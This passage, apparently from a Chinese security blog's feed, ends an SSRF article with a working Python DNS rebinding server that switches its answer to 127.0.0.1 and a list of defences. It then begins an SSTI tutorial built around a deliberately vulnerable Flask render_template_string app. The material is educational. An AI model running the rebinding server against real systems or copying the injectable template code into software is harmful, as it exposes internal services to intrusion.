&lt;p&gt;因此要利用时间差进行重绑定本质就是：&lt;strong&gt;利用两次解析同一域名的间隙(超过了TTL)，更换域名解析结果从而绕过防御。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;实际情况中会有不理想的情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;java中DNS请求成功的话默认缓存30s(字段为networkaddress.cache.ttl，默认情况下没有设置)，失败的默认缓存10s。可在/Library/Java/JavaVirtualMachines/jdk/Contents/Home/jre/lib/security/java.security 中配置&lt;/li&gt;
&lt;li&gt;在php中则默认没有缓存&lt;/li&gt;
&lt;li&gt;Linux默认不会进行DNS缓存，mac和windows会缓存&lt;/li&gt;
&lt;li&gt;有些公共DNS服务器，比如114.114.114.114会把记录进行缓存，但是8.8.8.8是严格按照DNS协议去管理缓存的，如果设置TTL为0，则不会进行缓存&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;利用&#34;&gt;利用&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;在线平台：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://lock.cmpxchg8b.com/rebinder.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://lock.cmpxchg8b.com/rebinder.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://requestrepo.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://requestrepo.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;自建DNS服务：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先需要指定某域名的域名服务器，设置NS记录：test.com NS dns.com&lt;/li&gt;
&lt;li&gt;也要有自建dns服务器(dns.com)的A记录，指明其IP：dns.com A 39.94.x.x&lt;/li&gt;
&lt;li&gt;自建服务器的DNS解析实现，使用python的 twisted.names(一个建立DNS服务端和客户端的库)：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;twisted.internet&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reactor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;defer&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;twisted.names&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dns&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;


&lt;span class=&#34;n&#34;&gt;record&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;DynamicResolver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;_doDynamicResponse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;record&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;record&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;# 随意一个可绕过检查的IP&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;104.160.43.154&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;record&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;record&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;record&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; ===&amp;gt; &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;answer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RRHeader&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;bp&#34;&gt;cls&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Record_A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;answers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;answer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;authority&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;additional&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;answers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;authority&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;additional&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;defer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;succeed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_doDynamicResponse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;factory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DNSServerFactory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;clients&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DynamicResolver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Resolver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;resolv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/etc/resolv.conf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;protocol&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DNSDatagramProtocol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;controller&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;factory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;reactor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;listenUDP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;53&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;protocol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;reactor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;raise&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;SystemExit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;防御&#34;&gt;防御&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;禁用不需要的协议，仅仅允许http和https请求。防止类似于&lt;code&gt;file、gopher、ftp&lt;/code&gt; 等引起的问题&lt;/li&gt;
&lt;li&gt;设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）&lt;/li&gt;
&lt;li&gt;限制端口&lt;/li&gt;
&lt;li&gt;验证返回内容：根据请求资源的类型验证返回内容是否符合该类型格式&lt;/li&gt;
&lt;li&gt;统一错误信息和回显内容&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>SSTI 相关</title>
        <link>https://coollllllll.github.io/p/ssti/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/ssti/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/ssti/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post SSTI 相关" /&gt;&lt;h1 id=&#34;ssti相关&#34;&gt;SSTI相关&lt;/h1&gt;
&lt;h2 id=&#34;模板&#34;&gt;模板&lt;/h2&gt;
&lt;p&gt;用于Web应用的模板引擎主要是为了让界面与数据分离。前端专门设计特定格式和风格的HTML模板(界面)，可根据用户输入内容进行填充(数据)，通过模板引擎生成HTML代码，响应给客户端以灵活展示。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Flask&lt;/code&gt;是一个用Python编写的轻量级Web应用程序框架，其使用&lt;code&gt;jinja2&lt;/code&gt;作为模板引擎。&lt;code&gt;jinja2&lt;/code&gt;基本语法有如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{`%` `%`}} # 语句

{{...}} # 表达式

{{#...#}} # 注释
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;基本原理&#34;&gt;基本原理&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;SSTL&lt;/code&gt;(服务端模板注入)的本质在于接收用户任意的输入并执行，造成服务端&lt;strong&gt;信息泄露、代码执行&lt;/strong&gt;等问题。&lt;/p&gt;
&lt;p&gt;例如jinja2模板中使用 &lt;code&gt;{{}}&lt;/code&gt; 语法表示一个变量值，是一种特殊的占位符，当利用 jinja2 进行渲染的时候，它会执行所接收到的内容并把这些特殊的占位符进行替换。&lt;/p&gt;
&lt;h2 id=&#34;flask模板注入&#34;&gt;flask模板注入&lt;/h2&gt;
&lt;h3 id=&#34;搭建环境&#34;&gt;搭建环境&lt;/h3&gt;
&lt;p&gt;安装flask：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip3 install flask
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;服务端：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;flask&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Flask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template_string&lt;/span&gt;
 
&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Flask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hello &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debug&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;@app.route(&amp;quot;/&amp;quot;)&lt;/code&gt;是route装饰器路由的使用，其将一个函数绑定至相应的URL上，当访问该URL时触发该函数。&lt;/p&gt;
&lt;p&gt;例如访问目标应用根路径，并传入name参数：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 437; 
			flex-basis: 1049px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128144703206.png&#34; data-size=&#34;516x118&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128144703206.png&#34;
			width=&#34;516&#34;
			height=&#34;118&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128144703206_hudf9ef00cfb153aaa5765b5da9047ae81_7824_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128144703206_hudf9ef00cfb153aaa5765b5da9047ae81_7824_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;基础&#34;&gt;基础&lt;/h3&gt;
&lt;p&gt;python中object类是所有类的基类，当定义一个类没有指定继承哪个类，则默认继承object类。&lt;/p&gt;
&lt;h4 id=&#34;内建属性和方法的使用&#34;&gt;内建属性和方法的使用&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__calss__&lt;/code&gt;表示当前类：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 578; 
			flex-basis: 1389px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128153758045.png&#34; data-size=&#34;220x38&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128153758045.png&#34;
			width=&#34;220&#34;
			height=&#34;38&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128153758045_hud95eab409004063d250ce65cec08073b_3106_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128153758045_hud95eab409004063d250ce65cec08073b_3106_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__base__&lt;/code&gt;列出当前类的直接父类：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 837; 
			flex-basis: 2009px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128153925267.png&#34; data-size=&#34;293x35&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128153925267.png&#34;
			width=&#34;293&#34;
			height=&#34;35&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128153925267_hufde5d002e5f37d251513c94fa0b63956_4294_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128153925267_hufde5d002e5f37d251513c94fa0b63956_4294_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__bases__&lt;/code&gt;以元组形式列出当前类的所有直接父类：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 882; 
			flex-basis: 2118px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128161331984.png&#34; data-size=&#34;309x35&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128161331984.png&#34;
			width=&#34;309&#34;
			height=&#34;35&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128161331984_hu116efdfcb75b9ecd44f10ec09ac9ae8e_4599_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128161331984_hu116efdfcb75b9ecd44f10ec09ac9ae8e_4599_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__mro__&lt;/code&gt;列出当前类的调用顺序，按照子类、父类、父类的父类顺序返回：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 827; 
			flex-basis: 1984px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128161534721.png&#34; data-size=&#34;306x37&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128161534721.png&#34;
			width=&#34;306&#34;
			height=&#34;37&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssti/image-20220128161534721_hu65a41effaddf471d83b3b033f5012877_4309_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssti/image-20220128161534721_hu65a41effaddf471d83b3b033f5012877_4309_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__subclasses__()&lt;/code&gt;当获取到object类之后，可以用该方法获取所有子类：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 372; 
			flex-basis: 893px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssti/image-20220128161810392.png&#34; data-size=&#34;577x155&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssti/image-20220128161810392.png&#34;
			width=&#34;577&#34;
			height=&#34;155&#34;
